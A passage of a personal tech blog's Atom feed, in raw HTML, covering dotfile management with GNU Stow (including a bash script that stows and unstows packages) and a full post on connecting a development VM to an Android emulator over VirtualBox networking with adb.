<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">lrwxrwxrwx  </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> kblagoev kblagoev   </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"> Oct  </span><span class="token number" style="color:#36acaa">6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">23</span><span class="token plain">:14 i3 -</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/code/dotfiles/i3/.config/i3/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>"But wait!", I hear you say. "Isn't this <code>i3</code> directory, or symlink, or whatever, supposed to be in our <code>$HOME</code> directory? What is it doing in <code>$HOME/code/</code>?".</p>
<p>You're absolutely right. Let's fix this. <em>Stow</em> has a flag <code>-t</code>, or <code>--target</code>, with which we can specify the root of the package management. This target is by default the parent of the <em>pwd</em>, and that's why by running <em>stow</em> inside of <code>$HOME/code/dotfiles/</code>, the symlinking occurred under <code>$HOME/code/</code> (and resulted in our symlink being <code>$HOME/code/.config/i3</code>. It can be a bit confusing to keep track of this, but yeah). So, instead, we want to target the <code>$HOME</code> directory. That's why we should run <code>stow -t $HOME i3</code> instead.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><p>If we don't place our <em>dotfiles</em> repository in the <code>$HOME</code> directory, we have to target it when we use <em>stow</em> by utilising the <code>-t</code> flag, e.g. <code>stow -t $HOME i3</code>.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="unstowing">Unstowing<a href="https://kblagoev.com/blog/using-stow-for-managing%20dotfiles#unstowing" class="hash-link" aria-label="Direct link to Unstowing" title="Direct link to Unstowing">​</a></h3>
<p>Removing a config is super simple with <em>stow</em> as well. Following our example with i3, we can simply run <code>stow -D -t $HOME i3</code>. The <code>-D</code> flag deletes the symlink, and our config is gone from the <code>$HOME/.config/</code> directory. And only that config!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="additional-note-on-usage">Additional note on Usage<a href="https://kblagoev.com/blog/using-stow-for-managing%20dotfiles#additional-note-on-usage" class="hash-link" aria-label="Direct link to Additional note on Usage" title="Direct link to Additional note on Usage">​</a></h2>
<p>There is a flag <code>--dotfiles</code>, which allows to rename hidden directories, such as <code>.whatever-the-name-is</code> to <code>dot-whatever-the-name-is</code>, and for them to be pre-processed by <em>stow</em> by replacing <code>dot-</code> with <code>.</code>. This is useful, so there aren't hidden files and directories in the repo. Quite useful for easier searching that respects hidden files.</p>
<p>This is great and all, but in the latest version of <em>stow</em> on Ubuntu there's a bug with that. The bug is fixed in the newest release of <em>stow</em>, but I will wait for it to get updated in <em>apt</em>, before migrating to that setting - just for availability reasons.</p>
<p>But if you're going to install the latest version of <em>stow</em>, do keep that option in your mind. It's pretty neat.</p>
<p>And lastly, for my own convenience, I've written a bash script which can stow and unstow all the packages inside my repo with one command. I've opted into having a manually updated list of the packages, just because I keep some other junk in the <em>dotfiles</em> repo, but this can be changed. I will paste the script here, if you'd like to use it yourself (or a modified version of it).</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">stow_config.sh</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token shebang important">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Define an array of package names</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">packages</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"bash"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"gtk-3.0"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"i3"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"i3blocks"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"terminator"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"nvim"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"fonts"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Check if the first argument is "remove" to use the -D flag</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">stow_flag</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"-t"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$1</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"remove"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token assign-left variable" style="color:#36acaa">stow_flag</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"-D -t"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Loop through each package and run stow or unstow with -D</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:#36acaa">package</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">${packages</span><span class="token string variable punctuation" style="color:#393A34">[</span><span class="token string variable" style="color:#36acaa">@</span><span class="token string variable punctuation" style="color:#393A34">]</span><span class="token string variable" style="color:#36acaa">}</span><span class="token string" style="color:#e3116c">"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$1</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"remove"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Unstowing </span><span class="token string variable" style="color:#36acaa">$package</span><span class="token string" style="color:#e3116c">..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Stowing </span><span class="token string variable" style="color:#36acaa">$package</span><span class="token string" style="color:#e3116c">..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  stow </span><span class="token variable" style="color:#36acaa">$stow_flag</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string environment constant" style="color:#36acaa">$HOME</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$package</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$?</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-eq</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$1</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"remove"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$package</span><span class="token string" style="color:#e3116c"> unstowed successfully."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$package</span><span class="token string" style="color:#e3116c"> stowed successfully."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$1</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"remove"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Error unstowing </span><span class="token string variable" style="color:#36acaa">$package</span><span class="token string" style="color:#e3116c">."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Error stowing </span><span class="token string variable" style="color:#36acaa">$package</span><span class="token string" style="color:#e3116c">."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"All done!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Running <code>./stow_config.sh</code> will stow, and running <code>./stow_config.sh remove</code> will unstow the listed packages.</p>
<p>That's it! glhf</p>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Coding" term="Coding"/>
        <category label="Configuration" term="Configuration"/>
        <category label="Productivity" term="Productivity"/>
        <category label="Linux" term="Linux"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to connect to an Android Emulator from VirtualBox]]></title>
        <id>https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox</id>
        <link href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox"/>
        <updated>2023-02-24T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Developing from a VM is great, but there's a problem when you have to run an emulator inside of it. My solution is to have two separate virtual machines running in VirtualBox on the host OS, and let them communicate using networking.]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="motivation">Motivation<a href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox#motivation" class="hash-link" aria-label="Direct link to Motivation" title="Direct link to Motivation">​</a></h2>
<p>If you're like me, you try and keep all of your coding-based clutter on a virtual machine. Which usually works great. You can maintain a clean OS, separate work from pleasure, and quickly return to a snapshot if something goes terribly wrong. But when I tried doing development for Android from a virtual machine, I quickly arrived at an unexpected hurdle.</p>
<p>If you try and run <a href="https://developer.android.com/studio" target="_blank" rel="noopener noreferrer">Android Studio</a>'s emulators, you'll quickly be reminded that you can't simply run a virtual machine inside a virtual machine. You technically can, if you enable <em>Nested VT-x/AMD-V</em>, but even if you succeed navigating the hell of starting an AVD android emulator from inside your VM, you'd be met by the huge performance hit of running nested virtualisation.</p>
<p>You can instead consider running either the <a href="https://www.genymotion.com/" target="_blank" rel="noopener noreferrer">Genymotion emulator</a> or <a href="https://xamarin.com/android-player" target="_blank" rel="noopener noreferrer">Xamarin Android Player</a>, which both use Oracle's <a href="https://www.virtualbox.org/" target="_blank" rel="noopener noreferrer">VirtualBox</a> to run their emulators. But instead of running them inside your VM (and being met with the issue of nested virtualisation), you can run these emulators on your host OS. Since both of these use VirtualBox, <strong>you can take full use of the networking aspect of VMs to connect your development VM to your Android emulator VM!</strong></p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Hence, my solution is to have two separate virtual machines running in VirtualBox on the host OS, and let them communicate using networking.</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="setup">Setup<a href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox#setup" class="hash-link" aria-label="Direct link to Setup" title="Direct link to Setup">​</a></h2>
<p>I'm assuming you've already</p>
<ol>
<li>Downloaded and installed VirtualBox</li>
<li>Set up a development VM inside of VirtualBox</li>
<li>Connected your dev VM to the outside world using either <em>NAT</em> or <strong>Bridged</strong> networking (I personally use bridged, since it helps me to easier access any web dev instances running in the VM)</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="creating-a-virtual-device">Creating a virtual device<a href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox#creating-a-virtual-device" class="hash-link" aria-label="Direct link to Creating a virtual device" title="Direct link to Creating a virtual device">​</a></h3>
<p>Alrighty, now we can download and install either <a href="https://www.genymotion.com/" target="_blank" rel="noopener noreferrer">Genymotion emulator</a> or <a href="https://xamarin.com/android-player" target="_blank" rel="noopener noreferrer">Xamarin Android Player</a> on your host OS.</p>
<p>After you've done that, you can start up your software, and set up a virtual device (phone) by following the instructions.</p>
<p><img loading="lazy" alt="created virtual device" src="https://kblagoev.com/assets/images/genymotion-devices-dff12f90942a44990988d4a6c83d5b10.png" width="1532" height="386" class="img_ev3q"></p>
<p>Now we need to do some configuration work inside VirtualBox.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="configuring-the-virtual-mobile-device">Configuring the virtual mobile device<a href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox#configuring-the-virtual-mobile-device" class="hash-link" aria-label="Direct link to Configuring the virtual mobile device" title="Direct link to Configuring the virtual mobile device">​</a></h3>
<p>If you open up VirtualBox, you'll see that the newly created virtual mobile device is listed in the list of machines.</p>
<p><img loading="lazy" alt="list virtual devices" src="https://kblagoev.com/assets/images/virtualbox-list-3b5a3c220f06e055963a16f93a8ba98b.png" width="976" height="678" class="img_ev3q"></p>
<p>We need to edit the network settings for the mobile device. It will need two adapters. One is to connect to the network of the development machine (NAT or Bridged). In my case the machines are in a bridged network, which makes it easier to access from the host OS, as well as between each-other.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><p>For some development platforms like React-Native, it's important that both the dev machine and mobile device are on the same network to allow easy debugging.</p></div></div>
<p><img loading="lazy" alt="mobile bridged adapter" src="https://kblagoev.com/assets/images/virtualbox-network-1-6dd7ab0921133098dea8f8e96abd2748.png" width="634" height="476" class="img_ev3q"></p>
<p>The other, arguably more important adapter to add/enable is the <strong>Host-only Adapter</strong>. This is the one <a href="https://developer.android.com/studio/command-line/adb" target="_blank" rel="noopener noreferrer">adb</a> will connect over.</p>
<p><img loading="lazy" alt="mobile host-only adapter" src="https://kblagoev.com/assets/images/virtualbox-network-2-5f94bf500d023db6843b5d7a24a0c9c6.png" width="629" height="475" class="img_ev3q"></p>
<p><strong>Make note of the adapter <em>name</em> here!</strong></p>
<p>VirtualBox has the habit of creating multiple host-only adapters, so this name is very important to make note of.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="configuring-the-development-vm">Configuring the development VM<a href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox#configuring-the-development-vm" class="hash-link" aria-label="Direct link to Configuring the development VM" title="Direct link to Configuring the development VM">​</a></h3>
<p>Now that we have set the mobile device settings up, we need to mirror them in the develpment VM. If you've used NAT for the mobile device, redo the settings in the development one. If you've put it into a bridged network, do the same to the dev VM.</p>
<p>After this, we need to add a <em>Host-only Adapter</em> to the dev VM. Did you take note of the Adapter name from the mobile machine? This is where you use it!</p>
<p><img loading="lazy" alt="dev machine host-only adapter" src="https://kblagoev.com/assets/images/virtualbox-network-3-bcd4db9880a0523c14773659a107589e.png" width="627" height="479" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="starting-up-the-machines">Starting up the machines<a href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox#starting-up-the-machines" class="hash-link" aria-label="Direct link to Starting up the machines" title="Direct link to Starting up the machines">​</a></h3>
<p>Normally, you just start them from their respective applications. Start the mobile machine from Xamarin or Genymotion, and start your dev VM from VirtualBox.</p>
<p>But I've found that if I start the mobile machine from Genymotion, it tends to reset the Host-only Adapter name, add a new one, and fail to start. So, if this happens to you, this is what I do:</p>
<ol>
<li>Start the mobile machine from VirtualBox. A command-line terminal will pop up, and will start loading.</li>
<li>When it appears that the terminal isn't doing anything anymore, you can safely start the mobile device from Genymotion.</li>
</ol>
<p><img loading="lazy" alt="mobile device ready to be started from genymotion" src="https://kblagoev.com/assets/images/genymotion-starting-674dbd0fa7a84a0f0770ed922ddb540a.png" width="721" height="468" class="img_ev3q"></p>
<p>This is how my terminal looks when it stops loading. At this stage, I start the device from Genymotion as normal.</p>
<p>If you haven't already, you can now start your development VM as well.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-the-mobile-device">Connecting to the mobile device<a href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox#connecting-to-the-mobile-device" class="hash-link" aria-label="Direct link to Connecting to the mobile device" title="Direct link to Connecting to the mobile device">​</a></h3>
<p>In this scenario, we are going to use <code>adb</code> to connect to the mobile device from the dev VM. All we need is the IP that the device is running on. Both Genymotion and Xamarin provide some way to see the IP.</p>
<p><img loading="lazy" alt="genymotion shows ip" src="https://kblagoev.com/assets/images/adb-ip-1-97587394079d4bdffd667180ea1917b3.png" width="605" height="81" class="img_ev3q"></p>
<p>But if you're having trouble to find it, you can go to VirtualBox, and see the IP from the terminal we saw earlier.</p>
<p><img loading="lazy" alt="virtualbox shows ip" src="https://kblagoev.com/assets/images/adb-ip-2-72e0b5031a51946d799118c103e50e00.png" width="721" height="468" class="img_ev3q"></p>
<p>So, now we can easily connect from our dev VM using the command-line tool <code>adb</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kblagoev@deva:~/Android/Sdk/platform-tools$ ./adb connect </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.68.101</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* daemon not running</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> starting now at tcp:5037</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* daemon started successfully</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">connected to </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.68.101:5555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kblagoev@deva:~/Android/Sdk/platform-tools$ </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="success">Success!<a href="https://kblagoev.com/blog/developing-on-android-emulator-from-virtualbox#success" class="hash-link" aria-label="Direct link to Success!" title="Direct link to Success!">​</a></h2>
<p>And since I've used a bridged network, I can also easily do network connections between the two devices, which can be quite useful in some cases. So I recommend it, unless you have your own way of doing it.</p>
<p>Now you can develop! Have fun!</p>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Coding" term="Coding"/>
        <category label="Programming" term="Programming"/>
        <category label="VMs" term="VMs"/>
        <category label="Android" term="Android"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to remember what I was reading about?]]></title>
        <id>https://kblagoev.com/blog/how-to-remember-what-i-was-reading-about</id>
        <link href="https://kblagoev.com/blog/how-to-remember-what-i-was-reading-about"/>
        <updated>2022-11-01T00:00:00.000Z</updated>
